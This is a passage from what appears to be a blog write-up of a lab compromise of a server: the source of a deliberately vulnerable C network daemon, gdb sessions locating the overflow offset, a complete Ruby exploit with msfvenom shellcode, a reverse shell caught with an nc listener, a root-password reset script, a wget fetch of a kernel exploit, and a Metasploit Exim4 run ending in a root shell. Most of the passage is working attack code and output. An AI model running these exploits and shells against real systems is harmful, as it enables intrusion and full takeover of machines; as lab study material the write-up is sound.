</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">hints</span><span class="p">);</span>
</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_family</span> <span class="o">=</span> <span class="n">AF_UNSPEC</span><span class="p">;</span>
</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_socktype</span> <span class="o">=</span> <span class="n">SOCK_STREAM</span><span class="p">;</span>
</span><span class='line'><span class="n">hints</span><span class="p">.</span><span class="n">ai_flags</span> <span class="o">=</span> <span class="n">AI_PASSIVE</span><span class="p">;</span> <span class="c1">// use my IP</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">rv</span> <span class="o">=</span> <span class="n">getaddrinfo</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">PORT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hints</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">servinfo</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;getaddrinfo: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">gai_strerror</span><span class="p">(</span><span class="n">rv</span><span class="p">));</span>
</span><span class='line'><span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// loop through all the results and bind to the first we can</span>
</span><span class='line'><span class="k">for</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">servinfo</span><span class="p">;</span> <span class="n">p</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">p</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_next</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="k">if</span> <span class="p">((</span><span class="n">sockfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_family</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_socktype</span><span class="p">,</span>
</span><span class='line'><span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_protocol</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;server: socket&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">continue</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_REUSEADDR</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">yes</span><span class="p">,</span>
</span><span class='line'><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;setsockopt&quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addr</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">ai_addrlen</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;server: bind&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">continue</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">break</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;server: failed to bind</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">return</span> <span class="mi">2</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">freeaddrinfo</span><span class="p">(</span><span class="n">servinfo</span><span class="p">);</span> <span class="c1">// all done with this structure</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="n">BACKLOG</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;listen&quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">sigchld_handler</span><span class="p">;</span> <span class="c1">// reap all dead processes</span>
</span><span class='line'><span class="n">sigemptyset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sa</span><span class="p">.</span><span class="n">sa_mask</span><span class="p">);</span>
</span><span class='line'><span class="n">sa</span><span class="p">.</span><span class="n">sa_flags</span> <span class="o">=</span> <span class="n">SA_RESTART</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;sigaction&quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;server: waiting for connections...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// main accept() loop</span>
</span><span class='line'><span class="n">sin_size</span> <span class="o">=</span> <span class="k">sizeof</span> <span class="n">their_addr</span><span class="p">;</span>
</span><span class='line'><span class="n">new_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sockfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">their_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sin_size</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">new_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;accept&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">continue</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="n">inet_ntop</span><span class="p">(</span><span class="n">their_addr</span><span class="p">.</span><span class="n">ss_family</span><span class="p">,</span>
</span><span class='line'><span class="n">get_in_addr</span><span class="p">((</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">their_addr</span><span class="p">),</span>
</span><span class='line'><span class="n">s</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">s</span><span class="p">);</span>
</span><span class='line'><span class="n">printf</span><span class="p">(</span><span class="s">&quot;server: got connection from %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fork</span><span class="p">())</span> <span class="p">{</span> <span class="c1">// this is the child process</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">sockfd</span><span class="p">);</span> <span class="c1">// child doesn&#39;t need the listener</span>
</span><span class='line'><span class="n">memset</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="s">&quot;HELO</span><span class="se">\n</span><span class="s">COMMAND:&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'><span class="n">perror</span><span class="p">(</span><span class="s">&quot;send&quot;</span><span class="p">);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">recv</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="n">vulnerable</span><span class="p">(</span><span class="n">net_buffer</span><span class="p">);</span>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="s">&quot;RECV: &quot;</span><span class="p">);</span>
</span><span class='line'><span class="n">strcat</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
</span><span class='line'><span class="n">send</span><span class="p">(</span><span class="n">new_fd</span><span class="p">,</span> <span class="n">out_buffer</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">out_buffer</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span>
</span><span class='line'><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="n">close</span><span class="p">(</span><span class="n">new_fd</span><span class="p">);</span> <span class="c1">// parent doesn&#39;t need this</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We copy buffd binary from server (/usr/local/sbin/buffd) and using metasploit
patterns we calculate the offset for EIP. To make an exploit reliable, we are
looking also for some registers, pointing to our pattern in memory.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/repo# gdb ./buffd  -q
</span><span class='line'>Reading symbols from /root/repo/buffd...done.
</span><span class='line'>(gdb) set follow-fork-mode child
</span><span class='line'>(gdb) run
</span><span class='line'>Starting program: /root/repo/buffd
</span><span class='line'>warning: no loadable sections found in added symbol-file system-supplied DSO at 0xb7fe0000
</span><span class='line'>server: waiting for connections...
</span><span class='line'>server: got connection from 127.0.0.1
</span><span class='line'>[New process 4201]
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 4201]
</span><span class='line'>0x65413165 in ?? ()
</span><span class='line'>(gdb) i r
</span><span class='line'>eax            0xbfffe790       -1073748080
</span><span class='line'>ecx            0x0      0
</span><span class='line'>edx            0xca     202
</span><span class='line'>ebx            0xb7fbeff4       -1208225804
</span><span class='line'>esp            0xbfffe810       0xbfffe810
</span><span class='line'>ebp            0x41306541       0x41306541
</span><span class='line'>esi            0x0      0
</span><span class='line'>edi            0x0      0
</span><span class='line'>eip            0x65413165       0x65413165
</span><span class='line'>eflags         0x10246  [ PF ZF IF RF ]
</span><span class='line'>cs             0x73     115
</span><span class='line'>ss             0x7b     123
</span><span class='line'>ds             0x7b     123
</span><span class='line'>es             0x7b     123
</span><span class='line'>fs             0x0      0
</span><span class='line'>gs             0x33     51
</span><span class='line'>(gdb) x /5x $eax
</span><span class='line'>0xbfffe790:     0x41306141      0x61413161      0x33614132      0x41346141
</span><span class='line'>0xbfffe7a0:     0x61413561
</span><span class='line'>
</span><span class='line'>root@kali32:~# nc 127.0.0.1 7777
</span><span class='line'>HELO
</span><span class='line'>COMMAND:Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
</span><span class='line'>^C
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x65413165
</span><span class='line'>[*] Exact match at offset 124
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x41306141
</span><span class='line'>[*] Exact match at offset 0</span></code></pre></td></tr></table></div></figure>


<p>EIP begins on offset 124 and the register EAX points to the beginning of our
buffer, right now filled with pattern. Luckily, we find call eax opcodes in
binary too.</p>

<p>The strange thing is that the stack in binary is marked as non-executable,
but on this server the exploit works and we don&rsquo;t get segfault:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ readelf -lW /usr/local/sbin/buffd
</span><span class='line'>Elf file type is EXEC (Executable file)
</span><span class='line'>Entry point 0x80488e0
</span><span class='line'>There are 7 program headers, starting at offset 52
</span><span class='line'>
</span><span class='line'>Program Headers:
</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x000e0 0x000e0 R E 0x4
</span><span class='line'>  INTERP         0x000114 0x08048114 0x08048114 0x00013 0x00013 R   0x1
</span><span class='line'>      [Requesting program interpreter: /lib/ld-linux.so.2]
</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x01004 0x01004 R E 0x1000
</span><span class='line'>  LOAD           0x001004 0x0804a004 0x0804a004 0x00170 0x0017c RW  0x1000
</span><span class='line'>  DYNAMIC        0x001018 0x0804a018 0x0804a018 0x000d0 0x000d0 RW  0x4
</span><span class='line'>  NOTE           0x000128 0x08048128 0x08048128 0x00020 0x00020 R   0x4
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4</span></code></pre></td></tr></table></div></figure>


<p>Exploit in Ruby:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># cat exploit.rb</span>
</span><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfelfscan -j ebp,ebx,esp,eax repo/buffd</span>
</span><span class='line'><span class="c1">#[repo/buffd]</span>
</span><span class='line'><span class="c1">#0x0804898f call eax</span>
</span><span class='line'><span class="c1">#0x08048efb call eax</span>
</span><span class='line'>
</span><span class='line'><span class="c1">#root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/exec -b &#39;\x00\xff&#39; CMD=&quot;/tmp/commands&quot; -f ruby</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\xdd\xc2\xd9\x74\x24\xf4\xbd\x38\x6f\xc2\x8c\x58\x33\xc9</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb1\x0d\x31\x68\x18\x03\x68\x18\x83\xc0\x3c\x8d\x37\xe6</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x37\x09\x21\xa5\x21\xc1\x7c\x29\x24\xf6\x17\x82\x45\x91</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\xe7\xb4\x86\x03\x81\x2a\x51\x20\x03\x5b\x6f\xa7\xa4\x9b</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\x40\xd3\xc9\xeb\xb1\x78\x7d\x61\xa0\x1f\xef\x1d\x49\xe0</span><span class="s2">&quot;</span> <span class="o">+</span>
</span><span class='line'><span class="s2">&quot;</span><span class="se">\xb8\x8e\x24\x01\x8b\xb1</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">exploit</span> <span class="o">=</span> <span class="n">buf</span> <span class="o">+</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">124</span> <span class="o">-</span> <span class="n">buf</span><span class="o">.</span><span class="n">length</span><span class="p">)</span>
</span><span class='line'><span class="n">exploit</span> <span class="o">&lt;&lt;</span> <span class="o">[</span><span class="mh">0x0804898f</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;V&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="s2">&quot;192.168.80.143&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">7777</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure>


<p>Exploit runs arbitrary command that we put on vulnerable server to /tmp/commands.</p>

<p>We connect to the host:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@:/home/testuser $ :backdoor.reversetcp -port 1337 192.168.80.137 -no-connect
</span><span class='line'>
</span><span class='line'>root@kali32:~# nc -lvp 1337
</span><span class='line'>listening on [any] 1337 ...
</span><span class='line'>192.168.80.143: inverse host lookup failed: Unknown server error : Connection timed out
</span><span class='line'>connect to [192.168.80.137] from (UNKNOWN) [192.168.80.143] 32787
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-2.05b$ cd /tmp</span></code></pre></td></tr></table></div></figure>


<p>To obtain root privileges, we can run ssh server and put to &lsquo;/tmp/commands&rsquo;
file the instructions to change root password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>debian:/tmp# chmod +x commands
</span><span class='line'>debian:/tmp# cat commands
</span><span class='line'>echo -e "1234\n1234\n" | passwd</span></code></pre></td></tr></table></div></figure>


<p>Kernel is vulnerable too, using this exploit we can get uid 0 privileges:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-2.05b$ wget -O socksend.c http://www.exploit-db.com/download/9479</span></code></pre></td></tr></table></div></figure>


<p>In Metasploit is there is another module which we can use to exploit Exim4
(exploit/unix/smtp/exim4_string_format). To make it work correctly, we need
to comment the following lines and also change exim to exim4:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="mi">114</span>     <span class="c1">#if not datastore[&#39;SkipVersionCheck&#39;] and self.banner !~ /Exim 4\.6\d+/i</span>
</span><span class='line'><span class="mi">115</span>     <span class="c1">#  fail_with(Failure::Unknown, &quot;Warning: This version of Exim is not exploitable&quot;)</span>
</span><span class='line'><span class="mi">116</span>     <span class="c1">#end</span>
</span><span class='line'><span class="o">.</span><span class="n">.</span><span class="o">.</span>
</span><span class='line'><span class="mi">341</span>       <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;PATH=/bin:/sbin:/usr/sbin:/usr/bin:/usr/local/sbin:/usr/local/bin exim4 -C</span><span class="si">#{</span><span class="n">temp_conf</span><span class="si">}</span><span class="s2"> -q</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(exim4_string_format) > rexploit
</span><span class='line'>[*] Reloading module...
</span><span class='line'>
</span><span class='line'>[*] Started reverse double handler
</span><span class='line'>[*] Connecting to 192.168.80.143:25 ...
</span><span class='line'>[*] Server: 220 localhost.localdomain ESMTP Exim 4.50 Sat, 09 May 2015 07:53:30 +0200
</span><span class='line'>[*] EHLO: 250-localhost.localdomain Hello cpR0uwxe.com [192.168.80.137]
</span><span class='line'>[*] EHLO: 250-SIZE 52428800
</span><span class='line'>[*] EHLO: 250-PIPELINING
</span><span class='line'>[*] EHLO: 250 HELP
</span><span class='line'>[*] Determined our hostname is cpR0uwxe.com and IP address is 192.168.80.137
</span><span class='line'>[*] MAIL: 250 OK
</span><span class='line'>[*] RCPT: 250 Accepted
</span><span class='line'>[*] DATA: 354 Enter message, ending with "." on a line by itself
</span><span class='line'>[*] Constructing initial headers ...
</span><span class='line'>[*] Constructing HeaderX ...
</span><span class='line'>[*] Constructing body ...
</span><span class='line'>[*] Sending 50 megabytes of data...
</span><span class='line'>[*] Ending first message.
</span><span class='line'>[*] Result: "552 Message size exceeds maximum permitted\r\n"
</span><span class='line'>[*] Sending second message ...
</span><span class='line'>[*] MAIL result: "250 OK\r\n"
</span><span class='line'>[*] RCPT result: "sh-2.05b$ "
</span><span class='line'>[*] Looking for Perl to facilitate escalation...
</span><span class='line'>[*] Perl binary detected, attempt to escalate...
</span><span class='line'>[*] Using Perl interpreter at /usr/bin/perl...
</span><span class='line'>[*] Creating temporary files /var/tmp/oYEMVjYJ and /var/tmp/LCpxpIyv...
</span><span class='line'>[*] Attempting to execute payload as root...
</span><span class='line'>[*] Accepted the first client connection...
</span><span class='line'>[*] Accepted the second client connection...
</span><span class='line'>[*] Command: echo QDibz6UzrEBUyJQT;
</span><span class='line'>[*] Writing to socket A
</span><span class='line'>[*] Writing to socket B
</span><span class='line'>[*] Reading from sockets...
</span><span class='line'>[*] Reading from socket B
</span><span class='line'>[*] B: "QDibz6UzrEBUyJQT\r\n"
</span><span class='line'>[*] Matching...
</span><span class='line'>[*] A is input...
</span><span class='line'>[*] Command shell session 1 opened (192.168.80.137:4444 -> 192.168.80.143:32803) at 2015-05-06 07:40:24 +0200
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root)</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
